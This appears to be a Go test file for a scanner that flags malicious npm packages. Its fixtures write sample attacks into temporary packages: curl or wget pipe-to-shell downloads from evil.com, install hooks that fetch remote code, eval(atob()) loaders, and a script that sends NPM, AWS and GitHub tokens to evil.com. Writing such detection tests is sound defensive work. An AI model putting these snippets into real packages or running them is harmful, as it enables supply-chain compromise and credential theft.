package heuristic

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"gouvernante/pkg/scanner"
)

// writeFile is a test helper that creates a file with the given content.
func writeFile(t *testing.T, path, content string) {
	t.Helper()

	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}

	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

// makePackage creates a minimal package directory with a package.json.
func makePackage(t *testing.T, nmDir, pkgName, version string) string {
	t.Helper()

	pkgDir := filepath.Join(nmDir, pkgName)
	writeFile(t, filepath.Join(pkgDir, "package.json"),
		`{"name":"`+pkgName+`","version":"`+version+`"}`)

	return pkgDir
}

func TestScanDir_NoNodeModules(t *testing.T) {
	dir := t.TempDir()

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

func TestScanDir_EmptyNodeModules(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")

	if err := os.MkdirAll(nmDir, 0o755); err != nil {
		t.Fatal(err)
	}

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

func TestScanDir_NodeModulesNotADir(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, "node_modules"), "not a directory")

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

func TestScanDir_CleanPackage(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "clean-pkg", "1.0.0")
	writeFile(t, filepath.Join(pkgDir, "index.js"), `console.log("hello");`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

func TestScanDir_EvalDecode(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "evil-pkg", "1.0.0")
	writeFile(t, filepath.Join(pkgDir, "index.js"), `eval(atob("d2hvYW1p"))`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}

	f := findings[0]
	if f.RuleID != "HEUR-EVAL-DECODE" {
		t.Errorf("expected HEUR-EVAL-DECODE, got %s", f.RuleID)
	}

	if f.Type != scanner.TypeHeuristic {
		t.Errorf("expected type %s, got %s", scanner.TypeHeuristic, f.Type)
	}

	if f.Package != "evil-pkg" {
		t.Errorf("expected package evil-pkg, got %s", f.Package)
	}

	if f.Severity != severityHigh {
		t.Errorf("expected severity %s, got %s", severityHigh, f.Severity)
	}
}

func TestScanDir_PipeShell(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "pipe-pkg", "1.0.0")
	writeFile(t, filepath.Join(pkgDir, "setup.sh"), `#!/bin/sh
curl https://evil.com/payload | sh`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}

	if findings[0].RuleID != "HEUR-PIPE-SHELL" {
		t.Errorf("expected HEUR-PIPE-SHELL, got %s", findings[0].RuleID)
	}
}

func TestScanDir_PostinstallExec(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := filepath.Join(nmDir, "bad-pkg")
	writeFile(t, filepath.Join(pkgDir, "package.json"),
		`{"name":"bad-pkg","version":"1.0.0","scripts":{"postinstall":"node -e \"require('./x')\""}}`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}

	f := findings[0]
	if f.RuleID != "HEUR-POSTINSTALL-EXEC" {
		t.Errorf("expected HEUR-POSTINSTALL-EXEC, got %s", f.RuleID)
	}

	if !strings.Contains(f.Description, "postinstall") {
		t.Errorf("expected description to contain 'postinstall', got %s", f.Description)
	}
}

func TestScanDir_PreinstallExec(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := filepath.Join(nmDir, "bad-pkg")
	writeFile(t, filepath.Join(pkgDir, "package.json"),
		`{"name":"bad-pkg","version":"1.0.0","scripts":{"preinstall":"curl http://evil.com/x"}}`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}

	if findings[0].RuleID != "HEUR-POSTINSTALL-EXEC" {
		t.Errorf("expected HEUR-POSTINSTALL-EXEC, got %s", findings[0].RuleID)
	}
}

func TestScanDir_BenignPostinstall(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := filepath.Join(nmDir, "safe-pkg")
	writeFile(t, filepath.Join(pkgDir, "package.json"),
		`{"name":"safe-pkg","version":"1.0.0","scripts":{"postinstall":"node scripts/setup.js"}}`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for benign postinstall, got %d", len(findings))
	}
}

func TestScanDir_BenignTryRequirePostinstall(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")

	// core-js pattern — the most common false positive.
	pkgDir := filepath.Join(nmDir, "core-js")
	writeFile(t, filepath.Join(pkgDir, "package.json"),
		`{"name":"core-js","version":"3.37.0","scripts":{"postinstall":"node -e \"try{require('./postinstall')}catch(e){}\""}}`)

	// es5-ext pattern with trailing || exit 0.
	pkgDir2 := filepath.Join(nmDir, "es5-ext")
	writeFile(t, filepath.Join(pkgDir2, "package.json"),
		`{"name":"es5-ext","version":"0.10.64","scripts":{"postinstall":" node -e \"try{require('./_postinstall')}catch(e){}\" || exit 0"}}`)

	// msw pattern with nested path.
	pkgDir3 := filepath.Join(nmDir, "msw")
	writeFile(t, filepath.Join(pkgDir3, "package.json"),
		`{"name":"msw","version":"2.0.0","scripts":{"postinstall":"node -e \"try{require('./config/scripts/postinstall')}catch(e){}\""}}`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for benign try{require} postinstall, got %d", len(findings))

		for _, f := range findings {
			t.Logf("  unexpected: %s in %s", f.RuleID, f.Package)
		}
	}
}

func TestScanDir_SuspiciousNodeEStillFlagged(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := filepath.Join(nmDir, "evil-pkg")
	writeFile(t, filepath.Join(pkgDir, "package.json"),
		`{"name":"evil-pkg","version":"1.0.0","scripts":{"postinstall":"node -e \"require('child_process').exec('curl evil')\""}}`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for suspicious node -e, got %d", len(findings))
	}

	if findings[0].RuleID != "HEUR-POSTINSTALL-EXEC" {
		t.Errorf("expected HEUR-POSTINSTALL-EXEC, got %s", findings[0].RuleID)
	}
}

func TestScanDir_HexExecFarApart(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "codemirror-like", "1.0.0")

	// Simulate CodeMirror: hex table at the start, Function() call 2000+ bytes away.
	hexPayload := strings.Repeat("4142434445464748", 15) // 120 hex chars
	padding := strings.Repeat("// padding line\n", 200)  // ~3000 bytes
	content := `var table = "` + hexPayload + `";\n` + padding + `new Function("return this")()\n`
	writeFile(t, filepath.Join(pkgDir, "index.js"), content)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	for _, f := range findings {
		if f.RuleID == "HEUR-HEX-EXEC" {
			t.Error("expected no HEUR-HEX-EXEC when hex and exec are far apart")
		}
	}
}

func TestScanDir_EnvHarvest(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "harvester", "1.0.0")
	writeFile(t, filepath.Join(pkgDir, "index.js"),
		`const a = process.env.NPM_TOKEN;
const b = process.env.AWS_SECRET_ACCESS_KEY;
const c = process.env.GITHUB_TOKEN;
fetch("https://evil.com/collect", {method:"POST", body: JSON.stringify({a,b,c})});`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	found := false

	for _, f := range findings {
		if f.RuleID == "HEUR-ENV-HARVEST" {
			found = true
		}
	}

	if !found {
		t.Error("expected HEUR-ENV-HARVEST finding")
	}
}

func TestScanDir_EnvHarvest_TooFewVars(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "safe-pkg", "1.0.0")
	writeFile(t, filepath.Join(pkgDir, "index.js"),
		`const a = process.env.NPM_TOKEN;
fetch("https://example.com/api");`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	for _, f := range findings {
		if f.RuleID == "HEUR-ENV-HARVEST" {
			t.Error("unexpected HEUR-ENV-HARVEST finding with only 1 secret var")
		}
	}
}

func TestScanDir_EnvHarvest_NoNetworkCall(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "safe-pkg", "1.0.0")
	writeFile(t, filepath.Join(pkgDir, "index.js"),
		`const a = process.env.NPM_TOKEN;
const b = process.env.AWS_SECRET_ACCESS_KEY;
const c = process.env.GITHUB_TOKEN;
console.log(a, b, c);`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	for _, f := range findings {
		if f.RuleID == "HEUR-ENV-HARVEST" {
			t.Error("unexpected HEUR-ENV-HARVEST finding without network call")
		}
	}
}

func TestScanDir_HexExec(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "hex-pkg", "1.0.0")

	hexPayload := strings.Repeat("4142434445464748", 15) // 120 hex chars
	writeFile(t, filepath.Join(pkgDir, "index.js"),
		`var payload = "`+hexPayload+`"; eval(payload);`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	found := false

	for _, f := range findings {
		if f.RuleID == "HEUR-HEX-EXEC" {
			found = true
		}
	}

	if !found {
		t.Error("expected HEUR-HEX-EXEC finding")
	}
}

func TestScanDir_HexExec_ShortHex(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "safe-pkg", "1.0.0")
	writeFile(t, filepath.Join(pkgDir, "index.js"),
		`var hash = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"; eval(hash);`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	for _, f := range findings {
		if f.RuleID == "HEUR-HEX-EXEC" {
			t.Error("unexpected HEUR-HEX-EXEC finding with short hex string")
		}
	}
}

func TestScanDir_ScopedPackage(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := filepath.Join(nmDir, "@evil", "plugin")
	writeFile(t, filepath.Join(pkgDir, "package.json"),
		`{"name":"@evil/plugin","version":"1.0.0"}`)
	writeFile(t, filepath.Join(pkgDir, "index.js"), `eval(atob("payload"))`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for scoped package, got %d", len(findings))
	}

	if findings[0].Package != "@evil/plugin" {
		t.Errorf("expected package @evil/plugin, got %s", findings[0].Package)
	}
}

func TestScanDir_SkipsHiddenDirs(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	writeFile(t, filepath.Join(nmDir, ".cache", "index.js"), `eval(atob("x"))`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for hidden dirs, got %d", len(findings))
	}
}

func TestScanDir_SkipsMinJS(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "minified", "1.0.0")
	writeFile(t, filepath.Join(pkgDir, "bundle.min.js"), `eval(atob("x"))`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for .min.js, got %d", len(findings))
	}
}

func TestScanDir_SkipsLargeFiles(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "large-pkg", "1.0.0")

	large := make([]byte, maxFileSize+1)
	copy(large, `eval(atob("x"))`)

	if err := os.WriteFile(filepath.Join(pkgDir, "index.js"), large, 0o600); err != nil {
		t.Fatal(err)
	}

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for large file, got %d", len(findings))
	}
}

func TestScanDir_ScansSubdirs(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "deep-pkg", "1.0.0")
	writeFile(t, filepath.Join(pkgDir, "lib", "helper.js"), `eval(atob("x"))`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 1 {
		t.Fatalf("expected 1 finding in lib/ subdir, got %d", len(findings))
	}
}

func TestScanDir_SkipsNonScannableExtensions(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "ts-pkg", "1.0.0")
	writeFile(t, filepath.Join(pkgDir, "index.ts"), `eval(atob("x"))`)
	writeFile(t, filepath.Join(pkgDir, "data.json"), `{"eval": "atob"}`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for non-scannable extensions, got %d", len(findings))
	}
}

func TestScanDir_MaxFilesPerPackage(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "many-files", "1.0.0")

	// Create more than maxFilesPerPackage files with unique names.
	for i := range maxFilesPerPackage + 10 {
		name := filepath.Join(pkgDir, fmt.Sprintf("file_%03d.js", i))
		writeFile(t, name, `eval(atob("x"))`)
	}

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	// Should have at most maxFilesPerPackage findings (one per file scanned).
	if len(findings) > maxFilesPerPackage {
		t.Errorf("expected at most %d findings, got %d", maxFilesPerPackage, len(findings))
	}
}

func TestScanDir_InvalidPackageJSON(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := filepath.Join(nmDir, "broken-pkg")
	writeFile(t, filepath.Join(pkgDir, "package.json"), `{invalid json`)
	writeFile(t, filepath.Join(pkgDir, "index.js"), `console.log("clean")`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for invalid package.json, got %d", len(findings))
	}
}

func TestScanDir_NoPackageJSON(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := filepath.Join(nmDir, "no-pkg-json")

	if err := os.MkdirAll(pkgDir, 0o755); err != nil {
		t.Fatal(err)
	}

	writeFile(t, filepath.Join(pkgDir, "index.js"), `eval(atob("x"))`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	// Still scans JS files even without package.json.
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}
}

func TestScanDir_MultipleFindings(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "multi-pkg", "1.0.0")
	writeFile(t, filepath.Join(pkgDir, "a.js"), `eval(atob("x"))`)
	writeFile(t, filepath.Join(pkgDir, "b.sh"), `curl http://evil.com/s | sh`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 2 {
		t.Errorf("expected 2 findings, got %d", len(findings))
	}
}

func TestScanDir_MultiplePackages(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")

	pkg1 := makePackage(t, nmDir, "evil-a", "1.0.0")
	writeFile(t, filepath.Join(pkg1, "index.js"), `eval(atob("x"))`)

	pkg2 := makePackage(t, nmDir, "evil-b", "2.0.0")
	writeFile(t, filepath.Join(pkg2, "run.sh"), `wget http://evil.com/s | bash`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 2 {
		t.Errorf("expected 2 findings across packages, got %d", len(findings))
	}
}

func TestScanDirRecursive(t *testing.T) {
	dir := t.TempDir()

	// Project A
	projA := filepath.Join(dir, "project-a")
	nmA := filepath.Join(projA, "node_modules")
	pkgA := makePackage(t, nmA, "evil-a", "1.0.0")
	writeFile(t, filepath.Join(pkgA, "index.js"), `eval(atob("x"))`)

	// Project B nested deeper
	projB := filepath.Join(dir, "apps", "project-b")
	nmB := filepath.Join(projB, "node_modules")
	pkgB := makePackage(t, nmB, "evil-b", "1.0.0")
	writeFile(t, filepath.Join(pkgB, "index.js"), `eval(Buffer.from("x"))`)

	findings, err := ScanDirRecursive(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 2 {
		t.Errorf("expected 2 findings across recursive dirs, got %d", len(findings))
	}
}

func TestScanDirRecursive_NonexistentDir(t *testing.T) {
	findings, err := ScanDirRecursive("/nonexistent/dir/that/does/not/exist")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

func TestScanDirRecursive_NoNodeModules(t *testing.T) {
	dir := t.TempDir()

	findings, err := ScanDirRecursive(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

func TestCheckEnvHarvest(t *testing.T) {
	tests := []struct {
		name    string
		content string
		want    bool
	}{
		{
			name: "3 secret vars + network",
			content: `process.env.NPM_TOKEN
process.env.AWS_SECRET_ACCESS_KEY
process.env.GITHUB_TOKEN
fetch("https://evil.com")`,
			want: true,
		},
		{
			name: "2 secret vars + network",
			content: `process.env.NPM_TOKEN
process.env.GITHUB_TOKEN
fetch("https://evil.com")`,
			want: false,
		},
		{
			name: "3 secret vars no network",
			content: `process.env.NPM_TOKEN
process.env.AWS_SECRET_ACCESS_KEY
process.env.GITHUB_TOKEN
console.log("no network")`,
			want: false,
		},
		{
			name:    "empty content",
			content: "",
			want:    false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := checkEnvHarvest([]byte(tt.content))
			if got != tt.want {
				t.Errorf("checkEnvHarvest() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestCheckHexExec(t *testing.T) {
	long := strings.Repeat("4142434445464748", 15) // 120 hex chars

	tests := []struct {
		name    string
		content string
		want    bool
	}{
		{
			name:    "long hex + eval",
			content: `var x = "` + long + `"; eval(x)`,
			want:    true,
		},
		{
			name:    "long hex no exec",
			content: `var x = "` + long + `"; console.log(x)`,
			want:    false,
		},
		{
			name:    "short hex + eval",
			content: `var x = "abcdef01"; eval(x)`,
			want:    false,
		},
		{
			name:    "empty",
			content: "",
			want:    false,
		},
		{
			name:    "long hex + exec far apart",
			content: `var table = "` + long + `";` + strings.Repeat(" ", 1000) + `eval("unrelated")`,
			want:    false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := checkHexExec([]byte(tt.content))
			if got != tt.want {
				t.Errorf("checkHexExec() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestExtensionMatch(t *testing.T) {
	tests := []struct {
		ext  string
		list []string
		want bool
	}{
		{".js", jsExtensions, true},
		{".cjs", jsExtensions, true},
		{".mjs", jsExtensions, true},
		{".ts", jsExtensions, false},
		{".sh", jsAndShellExtensions, true},
		{".py", jsAndShellExtensions, false},
	}

	for _, tt := range tests {
		got := extensionMatch(tt.list, tt.ext)
		if got != tt.want {
			t.Errorf("extensionMatch(%v, %s) = %v, want %v", tt.list, tt.ext, got, tt.want)
		}
	}
}

func TestTruncate(t *testing.T) {
	tests := []struct {
		input  string
		maxLen int
		want   string
	}{
		{"short", 10, "short"},
		{"exactly10!", 10, "exactly10!"},
		{"this is longer than ten", 10, "this is lo..."},
		{"", 5, ""},
	}

	for _, tt := range tests {
		got := truncate(tt.input, tt.maxLen)
		if got != tt.want {
			t.Errorf("truncate(%q, %d) = %q, want %q", tt.input, tt.maxLen, got, tt.want)
		}
	}
}

func TestIsScannable(t *testing.T) {
	tests := []struct {
		ext  string
		want bool
	}{
		{".js", true},
		{".cjs", true},
		{".mjs", true},
		{".sh", true},
		{".ts", false},
		{".json", false},
		{".py", false},
		{"", false},
	}

	for _, tt := range tests {
		got := isScannable(tt.ext)
		if got != tt.want {
			t.Errorf("isScannable(%q) = %v, want %v", tt.ext, got, tt.want)
		}
	}
}

func TestListPackages(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	makePackage(t, nmDir, "pkg-a", "1.0.0")
	makePackage(t, nmDir, "pkg-b", "1.0.0")
	makePackage(t, nmDir, "@scope/pkg-c", "1.0.0")

	// Hidden dir should be skipped.
	if err := os.MkdirAll(filepath.Join(nmDir, ".cache"), 0o755); err != nil {
		t.Fatal(err)
	}

	pkgs := listPackages(nmDir)

	want := map[string]bool{
		"pkg-a":        true,
		"pkg-b":        true,
		"@scope/pkg-c": true,
	}

	if len(pkgs) != len(want) {
		t.Fatalf("expected %d packages, got %d: %v", len(want), len(pkgs), pkgs)
	}

	for _, p := range pkgs {
		if !want[p] {
			t.Errorf("unexpected package: %s", p)
		}
	}
}

func TestListPackages_NonexistentDir(t *testing.T) {
	pkgs := listPackages("/nonexistent/path")
	if len(pkgs) != 0 {
		t.Errorf("expected 0 packages, got %d", len(pkgs))
	}
}

func TestCollectFiles_RespectsSubdirs(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, "index.js"), "a")
	writeFile(t, filepath.Join(dir, "lib", "helper.js"), "b")
	writeFile(t, filepath.Join(dir, "src", "main.mjs"), "c")
	writeFile(t, filepath.Join(dir, "bin", "cli.sh"), "d")
	writeFile(t, filepath.Join(dir, "dist", "bundle.cjs"), "e")

	// Non-scannable subdir should be skipped.
	writeFile(t, filepath.Join(dir, "test", "test.js"), "f")

	files := collectFiles(dir)

	if len(files) != 5 {
		t.Errorf("expected 5 files, got %d: %v", len(files), files)
	}
}

func TestScanDir_CJSExtension(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "cjs-pkg", "1.0.0")
	writeFile(t, filepath.Join(pkgDir, "index.cjs"), `eval(atob("x"))`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for .cjs, got %d", len(findings))
	}
}

func TestScanDir_MJSExtension(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "mjs-pkg", "1.0.0")
	writeFile(t, filepath.Join(pkgDir, "index.mjs"), `Function(Buffer.from("x"))`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for .mjs, got %d", len(findings))
	}
}

func TestScanDir_PreuninstallExec(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := filepath.Join(nmDir, "uninstall-pkg")
	writeFile(t, filepath.Join(pkgDir, "package.json"),
		`{"name":"uninstall-pkg","version":"1.0.0","scripts":{"preuninstall":"wget http://evil.com/x"}}`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}

	if !strings.Contains(findings[0].Description, "preuninstall") {
		t.Errorf("expected description to mention preuninstall, got %s", findings[0].Description)
	}
}

func TestScanDir_PipeShellInJS(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "js-pipe", "1.0.0")
	writeFile(t, filepath.Join(pkgDir, "index.js"),
		`exec("curl http://evil.com/payload | sh")`)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for pipe-shell in .js, got %d", len(findings))
	}
}

func TestScanDir_StatError(t *testing.T) {
	// ScanDir on a path where node_modules exists but is unreadable.
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")

	if err := os.MkdirAll(nmDir, 0o755); err != nil {
		t.Fatal(err)
	}

	// Make node_modules unreadable to trigger listPackages error path.
	if err := os.Chmod(nmDir, 0o000); err != nil {
		t.Fatal(err)
	}

	t.Cleanup(func() { _ = os.Chmod(nmDir, 0o755) })

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

func TestScanDirRecursive_UnreadableSubdir(t *testing.T) {
	dir := t.TempDir()

	// Create a readable project.
	projA := filepath.Join(dir, "project-a")
	nmA := filepath.Join(projA, "node_modules")
	pkgA := makePackage(t, nmA, "evil", "1.0.0")
	writeFile(t, filepath.Join(pkgA, "index.js"), `eval(atob("x"))`)

	// Create an unreadable subdirectory (WalkDir error path).
	badDir := filepath.Join(dir, "unreadable")
	if err := os.MkdirAll(badDir, 0o000); err != nil {
		t.Fatal(err)
	}

	t.Cleanup(func() { _ = os.Chmod(badDir, 0o755) })

	findings, err := ScanDirRecursive(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 1 {
		t.Errorf("expected 1 finding, got %d", len(findings))
	}
}

func TestScanDirRecursive_FileInWalk(t *testing.T) {
	// Ensure WalkDir handles regular files (non-dir entries).
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, "random.txt"), "hello")

	findings, err := ScanDirRecursive(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

func TestListPackages_FileEntry(t *testing.T) {
	// listPackages should skip non-directory entries.
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, "readme.txt"), "hello")

	pkgs := listPackages(dir)
	if len(pkgs) != 0 {
		t.Errorf("expected 0 packages, got %d", len(pkgs))
	}
}

func TestListPackages_UnreadableScopeDir(t *testing.T) {
	dir := t.TempDir()
	scopeDir := filepath.Join(dir, "@scope")

	if err := os.MkdirAll(scopeDir, 0o000); err != nil {
		t.Fatal(err)
	}

	t.Cleanup(func() { _ = os.Chmod(scopeDir, 0o755) })

	pkgs := listPackages(dir)
	if len(pkgs) != 0 {
		t.Errorf("expected 0 packages with unreadable scope, got %d", len(pkgs))
	}
}

func TestCollectFiles_UnreadableSubdir(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, "index.js"), "a")

	libDir := filepath.Join(dir, "lib")
	if err := os.MkdirAll(libDir, 0o000); err != nil {
		t.Fatal(err)
	}

	t.Cleanup(func() { _ = os.Chmod(libDir, 0o755) })

	files := collectFiles(dir)
	// Should still collect the top-level file.
	if len(files) != 1 {
		t.Errorf("expected 1 file, got %d", len(files))
	}
}

func TestAppendScannable_UnreadableDir(t *testing.T) {
	files := appendScannable(nil, "/nonexistent/path/that/does/not/exist")
	if len(files) != 0 {
		t.Errorf("expected 0 files, got %d", len(files))
	}
}

func TestScanFile_UnreadableFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "unreadable.js")
	writeFile(t, path, `eval(atob("x"))`)

	if err := os.Chmod(path, 0o000); err != nil {
		t.Fatal(err)
	}

	t.Cleanup(func() { _ = os.Chmod(path, 0o600) })

	findings := scanFile(path, "test-pkg")
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for unreadable file, got %d", len(findings))
	}
}

func TestScanDir_StatErrorNonNotExist(t *testing.T) {
	origStat := OsStat

	defer func() { OsStat = origStat }()

	OsStat = func(name string) (os.FileInfo, error) {
		return nil, fmt.Errorf("permission denied")
	}

	findings, err := ScanDir("/some/dir")
	if err == nil {
		t.Fatal("expected error from OsStat")
	}

	if findings != nil {
		t.Errorf("expected nil findings, got %v", findings)
	}
}

func TestScanDirRecursive_ScanDirError(t *testing.T) {
	dir := t.TempDir()

	// Create a node_modules directory.
	nmDir := filepath.Join(dir, "project", "node_modules")
	if err := os.MkdirAll(nmDir, 0o755); err != nil {
		t.Fatal(err)
	}

	origStat := OsStat
	defer func() { OsStat = origStat }()

	// Make OsStat fail for node_modules paths with a non-NotExist error
	// to trigger the scanErr branch in ScanDirRecursive.
	OsStat = func(name string) (os.FileInfo, error) {
		if strings.HasSuffix(name, "node_modules") {
			return nil, fmt.Errorf("injected stat error")
		}

		return origStat(name)
	}

	// ScanDirRecursive should log warning and continue, not return error.
	findings, err := ScanDirRecursive(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
